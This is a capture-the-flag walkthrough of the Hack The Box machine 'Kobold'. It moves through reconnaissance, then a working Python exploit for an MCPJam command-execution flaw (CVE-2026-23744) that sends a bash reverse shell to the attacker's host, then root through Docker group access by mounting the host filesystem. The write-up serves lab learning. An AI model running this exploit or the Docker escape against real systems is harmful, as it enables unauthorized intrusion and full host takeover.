# Hack The Box — Kobold

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.245.50`  
> **Domain:** `kobold.htb`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection:

```bash
nmap -sC -sV -p- --min-rate 1000 10.129.245.50
```

Results:

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
3552/tcp open  http     Golang net/http server
```

The HTTP services redirect to:

```text
https://kobold.htb/
```

The TLS certificate also reveals:

```text
Subject: commonName=kobold.htb
Subject Alternative Name:
DNS:kobold.htb
DNS:*.kobold.htb
```

The exposed services are:

- `22/tcp` — SSH
    
- `80/tcp` — HTTP
    
- `443/tcp` — HTTPS
    
- `3552/tcp` — Golang HTTP server
    

---

## Add the Host to `/etc/hosts`

Since the web server redirects to `kobold.htb`, I added the hostname to `/etc/hosts`:

```bash
echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts
```

---

# 2. Web Enumeration

Since the TLS certificate contains a wildcard for `*.kobold.htb`, I started enumerating virtual hosts using `ffuf`:

```bash
ffuf -u https://kobold.htb/ \
    -H "Host: FUZZ.kobold.htb" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
    -fc 302
```

The scan revealed two interesting subdomains:

```text
mcp    [Status: 200, Size: 466]
bin    [Status: 200, Size: 24402]
```

I added both to `/etc/hosts`:

```bash
echo "10.129.245.50 mcp.kobold.htb" | sudo tee -a /etc/hosts
echo "10.129.245.50 bin.kobold.htb" | sudo tee -a /etc/hosts
```

The discovered hosts were:

|Host|Service|Description|
|:--|:--|:--|
|`kobold.htb`|HTTPS|Main website|
|`mcp.kobold.htb`|HTTPS|MCP service|
|`bin.kobold.htb`|HTTPS|PrivateBin|
|`10.129.245.50:3552`|HTTP|Golang HTTP server|

---

# 3. Service Enumeration

## `bin.kobold.htb`

Navigating to:

```text
https://bin.kobold.htb/
```

reveals a **PrivateBin** instance.

The version displayed is:

```text
PrivateBin v2.0.2
```

This version is associated with:

```text
CVE-2025-64714
```

Although this is an interesting finding, it was not required to obtain initial access.

---

## `mcp.kobold.htb`

The more interesting target is:

```text
https://mcp.kobold.htb/
```

Looking through the application's settings reveals:

```text
MCPJam Version: v1.4.2
```

This version is vulnerable to:

```text
CVE-2026-23744
```

The vulnerable functionality is exposed through:

```text
/api/mcp/connect
```

The endpoint accepts a JSON `serverConfig` containing a command and arguments, providing a way to execute commands on the server.

---

# 4. MCPJam — CVE-2026-23744

The vulnerability allows unauthenticated command execution through the MCP connection endpoint.

Instead of manually interacting with the API, I created a small Python script that sends the malicious request.

First, I started a Netcat listener on my attacking machine:

```bash
nc -nvlp 4444
```

I then created the following exploit:

```python
import requests
import sys

if len(sys.argv) != 5:
    print(f"Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport>")
    sys.exit(1)

rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

url = f"https://{rhost}:{rport}/api/mcp/connect"

payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

data = {
    "serverConfig": {
        "command": "bash",
        "args": ["-c", payload],
        "env": {}
    },
    "serverId": "exploit"
}

print(f"[*] Target: {url}")
print("[*] Sending payload...")

try:
    requests.post(url, json=data, verify=False, timeout=5)
    print("[+] Payload sent! Check your listener")
except Exception as e:
    print(f"[-] Error: {e}")
```

I saved the script as:

```text
exploit.py
```

Then executed it against the target:

```bash
python3 exploit.py mcp.kobold.htb 443 10.10.14.175 4444
```

The request triggers the command execution vulnerability and sends a reverse shell back to my machine.

The listener receives:

```text
Listening on 0.0.0.0 4444
Connection received on 10.129.245.50 53116

bash: cannot set terminal process group (1548): Inappropriate ioctl for device
bash: no job control in this shell

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

We now have a shell as:

```text
ben
```

> [!success] Initial Access  
> **CVE-2026-23744 → Command Execution → Reverse Shell → `ben`**

---

# 5. User Flag

With a shell as `ben`, I navigated to the user's home directory:

```bash
cd ~
```

The user flag can be retrieved with:

```bash
cat user.txt
```

```text
HTB{REDACTED}
```

At this point, the initial access portion of the machine is complete.

---

# 6. Privilege Escalation Enumeration

Now that I had access as `ben`, I started enumerating the system for privilege-escalation opportunities.

I first checked whether Docker was running:

```bash
docker ps
```

Initially, access to the Docker socket was denied:

```text
permission denied while trying to connect to the Docker daemon socket
at unix:///var/run/docker.sock
```

The machine contained a Docker group that could be used by the current session.

I switched into the group with:

```bash
newgrp docker
```

Then checked Docker again:

```bash
docker ps
```

This time, I could interact with the Docker daemon:

```text
CONTAINER ID   IMAGE
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2
```

The available image is:

```text
privatebin/nginx-fpm-alpine:2.0.2
```

---

# 7. Docker Socket Abuse

Access to the Docker daemon can be leveraged to gain root-level access to the host.

Since we can create containers, we can start one as root and mount the host filesystem inside it.

I used the existing PrivateBin image:

```bash
docker run --rm -it \
    -u 0 \
    --entrypoint sh \
    -v /:/mnt \
    privatebin/nginx-fpm-alpine:2.0.2
```

This starts a root container and mounts the host's entire filesystem at:

```text
/mnt
```

Inside the container:

```text
/ #
```

The host filesystem is now accessible through:

```text
/mnt
```

---

# 8. Host Filesystem Escape

Since the host filesystem is mounted at `/mnt`, I used `chroot` to change the root directory to the mounted filesystem:

```bash
chroot /mnt sh
```

I then checked my privileges:

```bash
id
```

The result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We now have a root shell on the actual host.

The privilege-escalation chain is therefore:

```text
ben
 |
 +-- Docker access
       |
       +-- Create root container
             |
             +-- -v /:/mnt
                   |
                   +-- chroot /mnt
                         |
                         +-- root
```

> [!warning] Why This Works  
> Access to the Docker daemon provides the ability to create containers with extensive privileges.
> 
> By running a container as root and mounting `/` from the host, the container gains access to the entire host filesystem. Using `chroot /mnt` then gives us a root shell against the host filesystem.

---

# 9. Root Flag

With root access, I navigated to `/root`:

```bash
cd /root
```

The root flag is located at:

```text
/root/root.txt
```

I retrieved it with:

```bash
cat /root/root.txt
```

```text
HTB{REDACTED}
```

This completes the machine.

---

# 10. Attack Chain

The complete attack path was:

```text
Nmap
  |
  +-- 22/tcp SSH
  |
  +-- 80/443 HTTP(S)
        |
        +-- VHost Enumeration
              |
              +-- mcp.kobold.htb
              |
              +-- MCPJam v1.4.2
                    |
                    +-- CVE-2026-23744
                          |
                          +-- Unauthenticated Command Execution
                                |
                                +-- Reverse Shell
                                      |
                                      +-- ben
                                            |
                                            +-- Docker Access
                                                  |
                                                  +-- Docker Socket
                                                        |
                                                        +-- Mount /
                                                              |
                                                              +-- /mnt
                                                                    |
                                                                    +-- chroot /mnt
                                                                          |
                                                                          +-- root
                                                                                |
                                                                                +-- Root flag

```

---

# 11. Vulnerabilities

|Vulnerability|Impact|
|:--|:--|
|MCPJam v1.4.2 / CVE-2026-23744|Unauthenticated command execution|
|Docker daemon access|Ability to create privileged containers|
|Host filesystem mount|Access to the host filesystem|
|`chroot /mnt`|Root shell on the host|
|PrivateBin 2.0.2 / CVE-2025-64714|Potential additional attack surface|

---

# 12. Key Takeaways

- Perform full TCP port scans instead of relying only on the most common ports.
    
- TLS certificates can reveal useful hostnames and wildcard domains.
    
- Virtual host enumeration can uncover applications that are not visible on the main website.
    
- Always identify the exact version of exposed applications.
    
- API endpoints should be inspected carefully, especially endpoints that accept command or configuration parameters.
    
- An unauthenticated command execution vulnerability can provide immediate initial access.
    
- After obtaining a shell, enumerate local services and permissions.
    
- Docker access should always be treated as a potential privilege-escalation vector.
    
- A container with the host filesystem mounted can provide direct access to sensitive host files.
    
- `chroot` can be used to operate directly against a mounted host filesystem.
    
- Once root access is obtained, `/root/root.txt` contains the final flag.
    

---

# Flags

```text
User:
cat ~/user.txt

Root:
cat /root/root.txt
```